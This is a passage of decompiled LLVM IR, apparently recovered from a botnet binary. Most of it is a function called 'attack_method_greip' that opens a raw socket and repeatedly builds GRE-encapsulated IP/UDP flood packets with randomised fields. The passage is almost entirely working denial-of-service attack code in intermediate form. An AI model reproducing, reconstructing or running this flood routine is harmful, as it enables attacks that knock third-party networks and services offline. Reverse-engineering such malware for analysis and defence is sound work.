  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
